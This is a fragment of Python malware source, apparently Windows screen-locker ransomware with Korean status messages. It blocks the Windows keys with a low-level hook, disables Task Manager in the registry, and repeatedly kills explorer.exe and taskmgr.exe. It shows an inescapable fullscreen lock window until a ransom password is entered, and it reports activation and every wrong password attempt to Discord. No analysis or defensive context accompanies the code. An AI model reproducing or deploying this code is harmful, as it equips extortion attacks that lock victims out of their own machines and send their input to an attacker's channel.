if ctypes.sizeof(ctypes.c_void_p) == 8:
    WPARAM = ctypes.c_uint64
    LPARAM = ctypes.c_int64
else:
    WPARAM = ctypes.c_uint32
    LPARAM = ctypes.c_int32

LowLevelKeyboardProc = ctypes.WINFUNCTYPE(
    ctypes.c_long, ctypes.c_int, WPARAM, LPARAM
)

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.wintypes.DWORD),
        ("scanCode", ctypes.wintypes.DWORD),
        ("flags", ctypes.wintypes.DWORD),
        ("time", ctypes.wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]

_hook_proc_callback = None
hook_handle = None

def _hook_proc(nCode, wParam, lParam):
    if nCode >= 0 and wParam == WM_KEYDOWN:
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        if kb.vkCode in (VK_LWIN, VK_RWIN):
            return 1
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

def install_keyblock():
    global hook_handle, _hook_proc_callback
    if hook_handle:
        return
    if _hook_proc_callback is None:
        _hook_proc_callback = LowLevelKeyboardProc(_hook_proc)
    user32 = ctypes.windll.user32
    user32.SetWindowsHookExW.argtypes = [
        ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32
    ]
    user32.SetWindowsHookExW.restype = ctypes.c_void_p
    callback_ptr = ctypes.cast(_hook_proc_callback, ctypes.c_void_p)
    hook_handle = user32.SetWindowsHookExW(WH_KEYBOARD_LL, callback_ptr, 0, 0)
    if not hook_handle:
        print("[!] 키보드 후크 설치 실패.")

def uninstall_keyblock():
    global hook_handle
    if hook_handle:
        ctypes.windll.user32.UnhookWindowsHookEx(hook_handle)
        hook_handle = None

def kill_process(procname):
    subprocess.run(["taskkill", "/f", "/im", procname],
                   capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)

def poll_killer():
    while not _killer_stop.is_set():
        try:
            kill_process("explorer.exe")
            kill_process("taskmgr.exe")
        except Exception:
            pass
        _killer_stop.wait(0.5)

def disable_taskmgr_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except Exception:
        pass

def cleanup_lockdown():
    _killer_stop.set()
    uninstall_keyblock()
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                             0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableTaskMgr")
        winreg.CloseKey(key)
    except (FileNotFoundError, OSError):
        pass
    time.sleep(0.3)
    subprocess.Popen("explorer.exe", creationflags=subprocess.CREATE_NO_WINDOW)

class LockscreenGUI:
    def __init__(self, root, image_url=IMAGE_URL):
        self.root = root
        self.wrong_attempts = 0
        self.root.attributes("-fullscreen", True, "-topmost", True)
        self.root.overrideredirect(True)

        install_keyblock()
        disable_taskmgr_registry()

        _killer_stop.clear()
        killer = threading.Thread(target=poll_killer, daemon=True)
        killer.start()

        kill_process("explorer.exe")

        self.root.bind("<Alt-F4>", self._block)
        self.root.bind("<Escape>", self._block)
        self.root.bind("<F11>", self._block)
        self.root.bind("<Alt-space>", self._block)

        self.root.lift()
        self.root.focus_force()

        try:
            resp = requests.get(image_url, timeout=10)
            resp.raise_for_status()
            raw = Image.open(BytesIO(resp.content))
            if raw.mode != "RGBA":
                raw = raw.convert("RGBA")
            bg = Image.new("RGBA", raw.size, (10, 10, 10, 255))
            img = Image.alpha_composite(bg, raw).convert("RGB")
        except Exception:
            img = Image.new("RGB", (root.winfo_screenwidth(), root.winfo_screenheight()), (10, 10, 10))

        img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
        self.bg_tk = ImageTk.PhotoImage(img)

        canvas = tk.Canvas(root, highlightthickness=0, bg="black")
        canvas.pack(fill="both", expand=True)
        canvas.create_image(0, 0, image=self.bg_tk, anchor="nw")

        self.entry = tk.Entry(root, font=("Courier", 20), show="*", justify="center",
                              bg="black", fg="#00ff00", insertbackground="#00ff00",
                              insertwidth=2, relief="flat")
        canvas.create_window(root.winfo_screenwidth() // 2,
                             int(root.winfo_screenheight() * 0.88),
                             window=self.entry, width=350)
        self.root.bind("<Return>", self.check_pw)
        self.entry.focus_set()

        send_discord_message(":lock: **랜섬웨어 활성화됨**")

    def _block(self, event):
        return "break"

    def check_pw(self, e=None):
        global locker_window
        pw_entered = self.entry.get()
        if pw_entered == RANSOM_PW:
            send_discord_message(
                f":unlock: **랜섬웨어 잠금 해제됨** – 올바른 비밀번호 입력 (실패 {self.wrong_attempts}회 후)"
            )
            cleanup_lockdown()
            self.root.destroy()
            locker_window = None
        else:
            self.wrong_attempts += 1
            send_discord_message(
                f":no_entry: **비밀번호 오류 시도 #{self.wrong_attempts}**: `{pw_entered}`"
            )
            self.entry.delete(0, tk.END)

def run_gui():
    global locker_window
    if not locker_window:
        locker_window = tk.Tk()
        app = LockscreenGUI(locker_window)
        locker_window.mainloop()

